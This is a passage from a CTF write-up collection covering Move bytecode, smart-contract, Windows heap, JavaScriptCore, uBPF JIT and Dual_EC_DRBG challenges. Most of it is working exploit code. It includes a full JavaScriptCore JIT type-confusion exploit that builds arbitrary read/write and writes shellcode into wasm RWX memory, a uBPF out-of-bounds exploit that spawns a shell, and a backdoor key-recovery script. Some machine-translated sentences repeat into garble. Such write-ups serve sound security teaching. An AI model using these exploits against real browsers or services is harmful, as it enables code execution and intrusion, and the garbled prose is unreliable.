    check = int(sig * pow(msg,-d_,n)%n) * pow(pow(msg,2**(length-j-1),n),(d_>>(length-j-1)),n_) % n_
    if check == sig_:
        d = d_
        print("[+]",d)
        break
    else:
        length -= 1


for j in range(2,length):
    sig_ = get_sig(j)
    for i in range(2):
        d_ = (i << (length-j)) + d
        check = int(sig * pow(msg,-d_,n)%n) * pow(pow(msg,2**(length-j-1),n),(d_>>(length-j-1)),n_) % n_
        if check == sig_:
            d = d_
            print("[+]",bin(d))
            break
    else:
        print("[-] error",j)
        exit()
d = d + 1

print(decrypt(cipher,d))


```

## BlockChain

### mollvme

This challenge expects you to analyze Move Bytecode. Move language became popular as Sui and Aptos grow. However, there's little tool for Move analysis.

When you connect to the challenge server, it will provide you the bytecode in hex. You should first use Move's rust crate to disassemble the bytecode. Here's a simple code snippet:

```rust
use std::fs;

use move_binary_format::file_format::CompiledModule;

fn main() {
    // argument is file path
    let path = std::env::args()
        .nth(1)
        .expect("Expected path to bytecode file");

    // read bytecode from file
    let module_bytecode = fs::read(path).expect("Unable to read bytecode file");

    // println!("{:?}", module_bytecode);
    let compiled_module = CompiledModule::deserialize(&module_bytecode).unwrap();

    for func_def in compiled_module.function_defs {
        let code = func_def.code.as_ref().unwrap().code.clone();
        let mut i = 0;
        for bytecode in code {
            println!("{:?}: {:?}", i, bytecode);
            i += 1;
        }
        return; // we break early because the first function is the one we want
    }
}
```

After reading the human-friendly disassembled bytecode, the goal is clear: input a 32 bytearray to satisfy all constraints.

If you look closer, you'll notice that some bytecode will never be reached. This is because of the nature of blockchain languages: they rarely optimize code because a) it might violate the programmers intention b) it might introduce critical bugs.

There're two intended directions to go. First is to use static analysis, eliminating dead code. There exists lots of patterns like `if (ALWAYS_TRUE && ALWAYS_FALSE) return TRUE`. So this is a possible approach.

Another direction is to use symbolic execution. I only used ~40 types of bytecode, and many of them are similar. So the amount of work to implement an execution engine is doable.

I have a very ugly written symengine which I'm not going to post publicly. Feel free to DM me (@publicqi).

The overall structure is angr-like. There's a `Simgr` class that has a list of `State`. In a loop, call `step` on all states and check if any of the states reached target. For `step` function of a `State`, it returns a list of `State` again, depending on the execution status. For example, if a step of an instruction will diverge into two paths, it might return two `State`.

In the post game survey someone said it's a RE challenge, and I partially agree with that. But we need more tools in the blockchain world don't we?

### babyblock

```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

w3 = Web3(HTTPProvider('http://localhost:8545'))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

abi = """
[
	{
		"inputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"constant": false,
		"inputs": [
			{
				"internalType": "uint256",
				"name": "_num",
				"type": "uint256"
			}
		],
		"name": "guessNumber",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": true,
		"inputs": [],
		"name": "solved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}
]
"""

privatekey = 0x25ece0fd60eb70e6216623edf3a6f11f38f690cac80a4d7a35f4c60648e25043
acct = w3.eth.account.from_key(privatekey)
address = w3.eth.account.from_key(privatekey).address
# print(address)

#获取余额
# address = "0x1F933E837C02eE03497129e7C378b0BB9D502809"
contractaddr = "0x44e406030B4A55DF1db1De7dE01dfe3b1a05d908"

contract = w3.eth.contract(address=contractaddr, abi=abi)

guessed_number = w3.eth.get_block('latest')['timestamp'] % 10 + 1

# 如果block.timestamp的LSB不同于guessedNumber，那么加1
if (w3.eth.get_block('latest')['timestamp'] & 1) != (guessed_number & 1):
    guessed_number += 1

contract_txn = contract.functions.guessNumber(guessed_number).build_transaction({
    'from': address,
    'nonce': w3.eth.get_transaction_count(address),
    'gas': 1000000,
    'gasPrice': w3.to_wei('1', 'gwei')
})

signed_txn = acct.sign_transaction(contract_txn)
txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
print(txn_receipt)

print(contract.functions.isSolved().call())
```

## PWN

### RoGueGate



The analysis in ida leads to the conclusion that the `NT` heap is created and subsequent heap allocations are in `hHeap`.

```C++
// 获取标准输出流(stdout)，并设置其缓冲策略为无缓冲
v11 = _acrt_iob_func(1u);
setvbuf(v11, 0i64, 4, 0i64);
// 获取标准输入流(stdin)，并设置其缓冲策略为无缓冲
v12 = _acrt_iob_func(0);
setvbuf(v12, 0i64, 4, 0i64);
// 获取标准错误流(stderr)，并设置其缓冲策略为无缓冲
v13 = _acrt_iob_func(2u);
setvbuf(v13, 0i64, 4, 0i64);
// 设置进程缓解策略，防止创建子进程，所以只能用ORW来进行读取flag
v16 = 1;
SetProcessMitigationPolicy(13i64, &v16);
// 创建堆，如果创建失败，输出错误消息并退出程序
hHeap = HeapCreate(1u, 0i64, 0i64);
if ( !hHeap )
{
  v14 = sub_140009DF0(std::cerr, (__int64)"Heap creation failed");
  std::ostream::operator<<(v14, sub_14000A1B0);
  exit(1);
}
```

After entering the main function, it can be found that the header is generated random numbers, while the random number of sha512 encryption, the user input for sha512, while comparing the first five, the use of python can quickly complete that check.

```python
import hashlib
def crack_sha512_5(sha_str):
    for num in range(10000,9999999999):
        res = hashlib.sha512(str(num).encode()).hexdigest()
        if res[0:5] == sha_str:
            print(str(num))
            return(str(num))
crack_sha512_5("95a64")
```

The startGame function implements six main functions.

```
Please choose an operation:
1. Create User  // 申请一个堆块。存储结构为一个数组，但每个结构为 [flag,地址] 。
2. Modify User  // 修改申请的堆块，读取时使用了std::cin.read，所以可以读取二进制流，但是不可以读取0x1a。存在溢出。
3. Delete User  //free一个堆块。
4. Get User Name // 读取内存中的数据。
5. Into the forest!  //进入一个迷宫。里面包含了一些简单的逆向。
6. Exit
```

There is a check before manipulating the heap block because in Windows 0x1a stands for End of Text character and typing 0x1a will end the input prematurely.

![image-20230821203814184](https://cdn.ha1c9on.top/img/image-20230821203814184.png)



When editing the heap block, it can be noticed that each time it takes the length of the previously stored string + 8, so it means that each edit can be extended by 8 bytes longer than before.

![image-20230821210500201](https://cdn.ha1c9on.top/img/image-20230821210500201.png)



With the current information, it is possible to leak the heap head, modify both the forward and backward pointers, and construct an unlink, but there is a block at 0x1a. Currently, the program is unable to enter 0x1a. To enter 0x1a you need to modify the structure pointed to by the `ucrtbase.dll`->`__pioinfo` pointer. The `__pioinfo` points to the structure `__crt_lowio_handle_data`.

```C++
struct __declspec(align(8)) __crt_lowio_handle_data
{
  _RTL_CRITICAL_SECTION lock;
  __int64 osfhnd;
  __int64 startpos;
  unsigned __int8 osfile;  //修改为0x9
  __crt_lowio_text_mode textmode;
  char _pipe_lookahead[3];
  unsigned __int8 unicode : 1;
  unsigned __int8 utf8translations : 1;
  unsigned __int8 dbcsBufferUsed : 1;
  char mbBuffer[5];
};
```

After entering the forest, you can find out that it is a maze topic. `w/a/s/d` means up, left, down and right respectively. After analyzing and debugging it will be found that there are some functions that do not appear in the forest function references, further by the strings can be analyzed.

![image-20230821211912698](https://cdn.ha1c9on.top/img/image-20230821211912698.png)

Finding the reference reveals the function that registers the event, creating the coordinates mapped to the function. Mapped to x=9,y=3 and x=3,y=5 respectively. used this to hide the function.

![image-20230821211954973](https://cdn.ha1c9on.top/img/image-20230821211954973.png)

Puzzle Door can be found in the need to answer questions to get rewards, after analyzing it can be known that this is the encryption process of TEA.

![image-20230821212414710](https://cdn.ha1c9on.top/img/image-20230821212414710.png)

Put key = { 0x7777777, 0x1a1a1a1a1a, 0xfedcba98, 0x76543210 }; encrypted= { 0x638e384c, 0x6bd7b96a }; into python to decrypt, and when answered correctly, you can write an integer less than 0x100 to any address.

```
def de_tea():
    v = [0x638e384c, 0x6bd7b96a]
    k = [0x7777777, 0x1a1a1a1a, 0xfedcba98, 0x76543210]
    v = decrypt(v, k)  #77696E5F70776E5F
    def int_to_hex_to_string(i):
        hex_value = format(i, 'x')
        bytes_obj = bytes.fromhex(hex_value)
        return bytes_obj.decode()
    s_back = int_to_hex_to_string(v[0])
    print(s_back[::-1])
    s_back = int_to_hex_to_string(v[1])
    print(s_back[::-1])
#win_pwn_
```

![image-20230821215028304](https://cdn.ha1c9on.top/img/image-20230821215028304.png)

`ask_creature` 函数中，可以发现是`ucrtbase.dll`和程序的基址。同时获得一次大于0x20的读写。

![image-20230821215843009](https://cdn.ha1c9on.top/img/image-20230821215843009.png)

So far the analysis has been completed, utilizing the ideas:

1. Apply for five heap blocks and release No. 2 and No. 4.
2. Get the base address, and at the same time modify the header of heap block #2 to construct an unlink, at which point the #2 pointer points to the location where the #2 pointer is stored.
3. after constructing the unlink you can modify the osfile in the __crt_lowio_handle_data structure.
4. Overwriting the heap block modifies the pointer storing heap block #3. The ability to read and write arbitrarily is gained at this point.

Another way to do this is to not go out and use the second hidden function location after obtaining the unlink. Go straight out and modify the pointers in the other arrays to point to other pointers in close proximity.

After obtaining the arbitrary read/write capability, the addresses of other modules can be leaked by importing the dll addresses in the table. At this point, the ntdll address can be leaked, and thus the address of the stack can be obtained.

![image-20230822002729225](https://cdn.ha1c9on.top/img/image-20230822002729225.png)

### CoreJS

The patch does two main things:

1. remove the `clobberize` for the `ValueAdd` operation in `dfg jit`
2. remove some x86 platform checks in `jsCast`.

Using the first point it is possible to construct a `type confusion` in `dfg jit` (using `ValueAdd` to introduce a side effect), transforming an `ArryWithDouble` into an `ArrayWithContiguous` in a `ValueAdd`, and the jit-over code will still treat This array is still treated as an `ArryWithDouble`, and the `addrof` and `fakeobj` primitives can be constructed.

Using the checks removed in the second point, the function `static ALWAYS_INLINE JSValue getByVal(VM& vm, JSValue baseValue, JSValue subscript)` can be used to leak randomized structure ids and gain the ability to construct the correct fakeObj. ability to construct the correct makeObj

Then `gigacage` needs to be bypassed. Construct `fakeObj` to gain access to `victim->butterfly - 0x10`, which is controllable, to gain the ability to read and write to any address. Construct `shared butterfly` to get a new set of `addrof`, `fakeobj` primitives.

Finally, using the arbitrary read and write primitives, construct the wasm object, find the rwx segment address, and write the constructed shellcode.

exp.js

```python
//====================================
//        print object info
//====================================
function printObj(o){print(describe(o));}

//====================================
// convert between double and integer
//====================================
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    if(val > 0x2000000000000){
        return i2f(val-0x02000000000000);
    } else{
        var tmp = 0xffffffffffffffff - val +1;
        return tmp
    }
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

//==============================================
//bug: DFG will not clobberize world even if 
//     ValueAdd op cause a side effect.
//
//how to exp: Using ValueAdd to make a side effect.
//            Make a double array to a object array.
//            But in jited code, it will still be 
//            considered as a double array.
//==============================================

function addrof(obj){
    var victim = [13.37, 2.2, 114.514];
	victim['a'] = 1;
    var hax = function(o, evil){
        o[1] = 2.2;
        a = evil + 1; // make side effect here
        // the effect will not lead to clobberize or OSR
        // so this func is still jited, and the type of o will be kept
        return o[0];
    }

    // jit
    for(var i = 0; i < 10000; i++){
        hax(victim, {});
    }

	var objaddr = hax(victim, {
    toString:() => {victim[0] = obj; return 1;}
    });

    return f2i(objaddr);
}
//============= test addrof ===============
// arr = {a:1, b:2};
// printObj(arr);
// print(hex(addrof(arr)))
// readline()
//=========================================

function fakeobj(addr){
    var victim = [13.37, 2.2, 114.514];
	victim['a'] = 1;
    var hax = function(o, evil){
        o[2] = 514.114
        o[1] = 2.2;
        a = evil + 1; // make side effect here
        o[0] = addr;
    }

    // jit
    for(var i = 0; i < 10000; i++){
        hax(victim, {});
    }

    hax(victim, {
    toString:() => {victim[2] = {}; return 1;}
    });

    return victim[0];
}

//================================
//     leak structure id
//================================
print("[*] leak structure id ")
print("[*] spray ");
let noCow = 13.37;
let spray = [];
for(var i = 0; i < 1000 ; i++){
	spray.push([noCow, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]);
}

let leakTarget = [noCow, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

// let jscell_header = new Int64([
//       0x00, 0x10, 0x00, 0x00,     // m_structureID
//       0x7,                        // m_indexingType (ArrayWithDouble)
//       0x24,                       // m_type
//       0x08,                       // m_flags
//       0x1                         // m_cellState
// ]).asDouble();

let leakContainer = {
    cellHeader: i2obj(0x0108240700001000), 
    butterfly: leakTarget,
};
print("[*] crafted container");

let leakFakeObjAddr = addrof(leakContainer) + 0x10;
let leakFakeObj = fakeobj(i2f(leakFakeObjAddr));

print("[*] clean cached invalid id");
let legitArr = leakTarget;
results = [];
results.push(leakFakeObj[0]);
results.push(legitArr[0]);
  
f64[0] = results[0];
let structureID = u32[0];
print("[+] leak structure id: " + hex(structureID));
u32[1] = 0x01082407 - 0x20000;
leakContainer.cellHeader = f64[0];

//==========================================
//    getting aaw and aar
//==========================================
// var unboxed = eval('[' + '13.37,'.repeat(1000) + ']');
var unboxed = [noCow, 13.37, 13.37]; // ArrayWithDouble
let boxed = [{}];
let victim = [noCow, 14.47, 15.57];
victim.prop = 13.37;
//victim['prop_0'] = 13.37;
var unboxed_addr = addrof(unboxed);
print('[*] unboxed_addr = ' + hex(unboxed_addr));
var boxed_addr = addrof(boxed);
print('[*] boxed_addr = ' + hex(boxed_addr));
var victim_addr = addrof(victim);
print('[*] victim_addr = ' + hex(victim_addr));


// 1. fake obj
u32[0] = structureID; // Structure ID
u32[1] = 0x01082409 - 0x20000; // Fake JSCell metadata
var outer = {
    p0: f64[0],    // Structure ID and metadata
    p1: victim,   // butterfly
};

var fake_addr = addrof(outer) + 0x10;
print('[+] fake_addr = ' + hex(fake_addr));
driver = fakeobj(i2f(fake_addr));

u32[0] = structureID;
u32[1] = 0x01082407-0x20000; // Fake JSCell metadata
outer.p0 = f64[0];
var victim_butterfly = f2i(driver[1]);
print('[*] victim_butterfly = ' + hex(victim_butterfly));

// 2. create shared butterfly
u32[0] = structureID;
u32[1] = 0x01082409 - 0x20000; // Fake JSCell metadata
outer.p0 = f64[0];
print("[*] create shared butterfly")
driver[1] = unboxed;
var shared_butterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(shared_butterfly)));
driver[1] = boxed;
victim[1] = shared_butterfly;

// set driver's cell header to double array
u32[0] = structureID;
u32[1] = 0x01082407-0x20000; // Fake JSCell metadata
outer.p0 = f64[0];
driver[1] = i2f((victim_butterfly));

function newAddrof(obj) {
   boxed[0] = obj;
   return f2i(unboxed[0]);
}


function newFakeobj(addr) {
     unboxed[0] = i2f(addr);
     return boxed[0];            
}


var new_victim = [];
/* victim.p0 is at victim->butterfly - 0x10 */
new_victim.p0 = 0x1337;
function victim_write(val) {
     new_victim.p0 = val;
}

function victim_read() {
     return new_victim.p0;
}

outer.p1 = new_victim;

function read64(addr) {
    driver[1] = i2f(addr+0x10);
    return newAddrof(victim_read());
}


function write64(addr, val) {
    driver[1] = i2f(addr+0x10);
    victim_write(val);
}

function write(where, values) {
    for (var i = 0; i < values.length; ++i) {
        if (values[i] != 0)
            this.write64(where + i*8, values[i])
    }
}

//=====================================
//       hijack control flow
//=====================================
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var addr_f = addrof(f);
print("[+] wasmObj addr: " + hex(addr_f));
var addr_p = read64(addr_f + 0x30);
var addr_shellcode = read64(addr_p);
print("[+] rwx addr: " + hex(addr_shellcode));


var shellcode = [2.599171142164121e-71, 2.9952128517353027e-80, -2.3232808130702675e+35, 4.25349812314964e-309];

// write shellcode to rwx mem
write(addr_shellcode, shellcode);
// readline();

// trigger shellcode to execute
f();


```

### jit

There is an access out-of-bounds checking error in the conversion of the program, which can be exploited to read or write arbitrary addresses through the access out-of-bounds error.
Dynamic flags need to be written to the /home/ctf/flag file.

```python
import ubpf.assembler
from pwn import *
context.log_level = "debug"
#sh = process(['jit'])
sh = remote('127.0.0.1', 9999)

program = '''
ldxdw %r0, [%r1+0x58]
sub %r0, 0x61bd0
mov %r2, %r0
add %r2, 0x52290
mov %r3, %r0
add %r3, 0x1eee48
stxdw [%r3], %r2
exit
'''

program = ubpf.assembler.assemble(program).encode('hex')

sh.sendlineafter("Program: ", program)

# gdb.attach(sh, '''
# b *$rebase(0x2947)
# c
# si
# ''')
sh.sendlineafter("Memory: ", "/bin/sh".encode('hex'))



sh.interactive()

```

### 面壁计划管理系统2.5

1. Open the attachment, you can see `aiortc` and `aioice` two library files, use `diff` and the main branch of these two libraries for `diff` to find the difference, but the question vulnerability does not exist in the library files, this will not be expanded. **(But when writing EXP, you must use the library given in the attachment, not the master branch)**.
2. Then first analyze the given source code `app_beta.py`.

```python
if __name__ == "__main__":
    s = "XXX" # Only For Beta Version
    E = keyGenerator(s)
    leakFirst, newState = E.gen()
    E.update(newState)
    leakSecond, newState = E.gen()
    observed = (leakFirst << (2 * 8)) | (leakSecond >> (28 * 8))
    backupStr = f"{E.d}-{observed}"
    BuildPKSK()
    E.update(newState)
    ApplicationKey, _ = E.gen()
    app = web.Application()
    app.on_shutdown.append(on_shutdown)
    app.router.add_get("/", index)
    app.router.add_post("/download", download)
    app.router.add_post("/deepConnect", deepConnect)
    web.run_app(
        app, access_log=None, host='0.0.0.0', port='23333'
    )
```

`main`function shows that the program starts with a secret value s, and subsequently the key is initialized using s. How does the initialization operation work?

```python
class keyGenerator(object):
    def __init__(self, seed):
        self.seed = seed
        self.P = P256.G
        # Only For Beta Version
        self.d = 0000000000000000000000000000000000000000000000000000000000000
        e = mod_inv(self.d, P256.q)
        self.Q = e * self.P

    def gen(self, seed=None):
        if seed == None:
            seed = self.seed
        r = (seed * self.P).x
        x = (r * self.Q).x
        return x & (2**(8 * 30) - 1), r

    def update(self, seed):
        self.seed = seed
```

The trace discovery program used ECC's P256 curve and selected a second secret value d, which was subsequently used to generate the public key Q.
Returning to the main function, the program then performs two rounds of state generation and stores some of the generated states as observed after arithmetic.
After that, a third round of state generation is performed and the state generated in this round is the session secret key ApplicationKey.
In addition, the program calls the KDF algorithm to generate PKSK using RootKey, this process has no secret value, and the result can be obtained by running directly.

```python
rootKey = "68acba52-7f6f-4274-ab1c-219607dd864e"
PKSK = {"backup":"","admin":""}

def BuildPKSK():
    global PKSK
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=rootKey.encode(),iterations=480000)
    PKSK["backup"] = kdf.derive(rootKey.encode())
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=PKSK["backup"],iterations=480000)
    PKSK["admin"] = kdf.derive(PKSK["backup"])
```

The end of these processes is the initialization of the Webapplication, and you can see that there are three routes, `/`, `/download`, and `/deepConnect`.
The `/` route is not useful and is skipped and not analyzed here. The `/deepConnect` only gives the core code:

```python
if isinstance(receiveMessage, str) and receiveMessage.startswith("XXXXXXXXXX"):
    command = message.split("XXXXXXXXXX")[-1]
    if checkAuthRes == "admin":
        outinfo = subprocess.getstatusoutput(("./editDatabase \"" + command + "\""))
        reply = ""
        if outinfo == None:
            reply = "系统无回应"
        else:
            reply = outinfo[-1]
        channel_send(channel, reply.replace('\n',''))
    elif checkAuthRes == "backup":
        reply = f"备份信息如下：{backupStr}"
        channel_send(channel, reply.replace('\n',''))
    else:
        reply = f"权限不足！"
        channel_send(channel, reply.replace('\n',''))
```

Simply put, deepConnect accepts string input, which must be prefixed with a string. In addition, this function accepts an authentication field, and when the user is `admin', the user's input is passed to the program editDatabase on the backend of the web and the results of the program run are returned; when the user is `backup', the secret values d and observed are returned.
The code for `/download` is analyzed next:

```python
async def download(request):
    query = query_parse(request)
    try:
        params = await request.json()
    except json.decoder.JSONDecodeError:
        content = "非法的访问行为！"
        return web.Response(status=403, content_type="text/html", text=content)
    
    if params == {} or "username" not in params.keys() or "timestamp" not in params.keys() or "Token" not in params.keys():
        content = "非法的访问行为！"
        return web.Response(status=403, content_type="text/html", text=content)
    
    checkAuthRes = checkAuth(params)

    if query == None or 'file' not in query.keys():
        content = "PDC 已经记录了您这次访问行为，普通民众请勿随意访问此系统！"
        return web.Response(status=403, content_type="text/html", text=content)
    
    filename = query.get('file')
    file_dir = '/app/download'
    file_path = os.path.join(file_dir, filename)
    if (filename not in ['editDatabase','ssl.log','app']) or ((filename in ['editDatabase','app']) and (checkAuthRes[0] != 'admin')):
        async with aiofiles.open('/dev/urandom', 'rb') as f:
            content = await f.read(random.randint(2333,23333))
            if content:
                md5Object = hashlib.md5()
                md5Object.update(filename.encode())
                safeFilename = md5Object.hexdigest().upper()
                response = web.Response(
                    content_type='application/octet-stream',
                    headers={'Content-Disposition': 'attachment;filename={}'.format(safeFilename)},
                    body=content)
                return response
            else:
                return web.Response(status=404, content_type="text/html", text="文件为空")
    else:
        if os.path.exists(file_path):
            async with aiofiles.open(file_path, 'rb') as f:
                content = await f.read()
            if content:
                response = web.Response(
                    content_type='application/octet-stream',
                    headers={'Content-Disposition': 'attachment;filename={}'.format(filename)},
                    body=content)
                return response
            else:
                return web.Response(status=404, content_type="text/html", text="文件为空")
        else:
            return web.Response(status=404, content_type="text/html", text="文件未找到")
```

First of all, it is clear that this method accepts two types of input, a query input in the form of `POST url/path?key=value`, and data in the form of json in the body of the `POST` message. The method starts by verifying if the data data contains the three keys `username`, `timestamp` and `Token`, if it does then the data is fed to the authentication method.

```python
def checkAuth(content):
    timestamp = int(round(time.time()) * 1000)
    if not isinstance(content,dict):
        content = json.loads(content)
    signStringEnc = base64.b64decode(content.pop('Token').encode()).decode()
    keys = sorted(content.keys())
    signString = ""
    for key in keys:
        signString += f"{key}={content[key]}&"
    md5Object = hashlib.md5()
    md5Object.update(PKSK[content["username"]])
    signValue = md5Object.hexdigest().upper()
    signString += signValue
    # Release Version a=ApplicationKey
    a = 00000000000000000000000000000000000000000000000000000000000
    a = a.to_bytes(32, 'big')
    signStringEncServer = encrypt_cbc(signString, a[:16], a[16:32])
    if signStringEncServer == signStringEnc:
        if(timestamp - int(content["timestamp"]) < 600000):
            return (content["username"],json.loads(content["data"]))
        else:
            return ("Hacker","Timeout!")
    else:
        return ("Hacker","Hacker!")
```

The authentication method will take the current timestamp, then take out the Token field and inverse the original code, then splice the remaining fields according to the dictionary order and the specified format, then splice the sk corresponding to username, then encrypt the spliced string with SM4 and compare the decryption result with the original Token code, if it is consistent, it passes the authentication, and then compare the timestamp to see if it is expired. After that, compare the timestamp to see if it has expired.
Back to the download method, after passing the validation, the method will take the file name from the query input, and then splice it with '/app/download' to get the file. Among them, 'editDatabase', 'app' is limited to 'admin' and 'ssl.log' is not.

3. Okay, so the next step is to first try to get the 'ssl.log' file by first constructing a script to download the target file.

```python
url = "http://150.158.22.157:32772/download"

if __name__ == "__main__":
    timeStamp = int(round(time.time()) * 1000)
    # ssl.log
    data = {"username": "backup", "timestamp": timeStamp, "Token": ""}
    params = {"file":"ssl.log"}
    res = requests.get(url,params=params,json=data)
    with open("ssl.log","wb") as f:
        f.write(res.content)
        f.close()
```

![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713212707.png)
Opening the traffic packet reveals a large amount of redundant traffic within it, filtering `HTTP` traffic
![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713212957.png)
Re-filtering with discovered ip
![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713213143.png)
Get core traffic, load ssl.log to decrypt DTLS traffic
![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713213906.png)
Decryption reveals that the secret values d and observed are returned.

4. Checking the information, it is known that `Dual_EC_DRBG` backdoor exists in the `NIST P-256` curve, which can predict `ApplicationKey` by the secret value d and observed The following is the exploit script.

```python
class keyGenerator(object):
    def __init__(self, seed):
        self.seed = seed
        self.P = P256.G
        self.d = 11719814915940862664165027722377288066521783304814624837698954187856701194820
        e = mod_inv(self.d, P256.q)
        self.Q = e * self.P

    def gen(self, seed=None):
        if seed == None:
            seed = self.seed
        r = (seed * self.P).x
        x = (r * self.Q).x
        return x & (2**(8 * 30) - 1), r

    def update(self, seed):
        self.seed = seed

def mod_inv(a, m):
    return pow(a, m-2, m)

def p256_mod_sqrt(z):
    return pow(z, (P256.p + 1) // 4, P256.p)

def valid_point(x_coordinate):
    y_2 = ((x_coordinate**3) - (3 * x_coordinate) + P256.b) % P256.p
    y = p256_mod_sqrt(y_2)

    if y_2 == y**2 % P256.p:
        return y
    else:
        return False

def brute(intercepted, d, Q):
    possible_points = []
    check = intercepted & 0xffff
    bits = 2**16
    for lsb in range(bits):
        output = (lsb << (8 * 30)) | (intercepted >> (8 * 2))
        y = valid_point(output)
        if y:
            try:
                point = Point(output, y, curve=P256)
                s = (d * point).x
                val = (s * Q).x & (2**(8 * 30) - 1)
                possible_points.append(point)
                if check == (val >> (8 * 28)):
                    return val & (2**(8 * 28) - 1), s, possible_points
            except:
                continue
        else:
            continue
    return None, None, None

if __name__ == "__main__":
    seed = ""
    E = keyGenerator(seed)
    _, attacker_state, points = brute(106660164750584597884584943223559625875956141342602527536197888828028899150101, E.d, E.Q)
    ApplicationKey, _ = E.gen(seed=attacker_state)
    print(f"Break Success！ApplicationKey IS {ApplicationKey}")
```

![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713215152.png)
Then with the ApplicationKey, you can construct the credentials for the admin user.

5. Use the credentials of the admin user to further download `app` and `editDatabase`.

```python
 None
url = "http://150.158.22.157:32772/download"
rootKey = "68acba52-7f6f-4274-ab1c-219607dd864e"
PKSK = {"backup":"","admin":""}

def BuildPKSK():
    global PKSK
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=rootKey.encode(),iterations=480000)
    PKSK["backup"] = kdf.derive(rootKey.encode())
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=PKSK["backup"],iterations=480000)
    PKSK["admin"] = kdf.derive(PKSK["backup"])

def buildAuth(content):
    content = {
        "username": "admin",
        "timestamp": str(int(round(time.time()) * 1000)),
        "data": json.dumps(content)
    }
    keys = sorted(content.keys())
    signString = ""
    for key in keys:
        signString += f"{key}={content[key]}&"
    md5Object = hashlib.md5()
    print(PKSK)
    md5Object.update(PKSK[content["username"]])
    signValue = md5Object.hexdigest().upper()
    signString += signValue
    a = 1008956236999729824676341145279672622966475920266132279806853595614877312
    a = a.to_bytes(32, 'big')
    signStringEnc = encrypt_cbc(signString, a[:16], a[16:32])
    content["Token"] = base64.b64encode(signStringEnc.encode()).decode()
    # print(json.dumps(content))
    return content


if __name__ == "__main__":
    BuildPKSK()
    timeStamp = int(round(time.time()) * 1000)
    # app
    data = buildAuth({})
    params = {"file":"app"}
    res = requests.post(url,params=params,json=data)
    with open("app","wb") as f:
        f.write(res.content)
        f.close()

    # editDatabase
    data = buildAuth({})
    params = {"file":"editDatabase"}
    res = requests.post(url,params=params,json=data)
    with open("editDatabase","wb") as f:
        f.write(res.content)
        f.close()
```

![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713215937.png)

6. Let's start with the app and analyze it using IDA
  ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713220601.png)
7. You may find a large number of py identifiers here and then be tempted to reverse them using the python reverse tool, unfortunately this elf is not packaged using pyinstaller, which means that you can only reverse analyze it using IDA, however, on the app side we only need to know the general logic of deepConnect, so in fact we **don't need** to reverse the app.
   We can find out directly from the traffic that the Client is in fact interacting with the Server using a standard WebRTC channel, so implementation-wise we just need to build a standard WebRTC channel for the interaction.
8. Next is editDatabase, which is analyzed using IDA
  ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713223357.png)
  Found the UPX shell as well as the version number, so used UPX to remove the shell
  ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713223544.png)
  The decompilation results were found to be normal and the debugging was found to be
  ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713223743.png)This anti-debugging can be easily bypassed, and the method of overcoming anti-debugging will not be repeated here.
  The point of vulnerability is located in the
9. ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713223935.png)
  There is a stack overflow and the program protection is not canary enabled.
  ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713224958.png)
10. Although we have found the vulnerability point, however, since we can't directly interact with editDatabase more than once, it makes no sense to take the shell, and checking the logic actually reveals that this binary program is the one that interacts with the database, so it is possible that the flag exists in the database. main function provides add, delete, and change functionality, and the list of functions in fact The main function provides add, delete, and change functions, while the function list actually provides a lookup function. The main function provides add, delete and change functions, while the function list in fact provides a check function, and notice that there is a **SQL injection point** in the check function.
  ![](https://cdn.ha1c9on.top/img/Pasted%20image%2020230713225442.png)
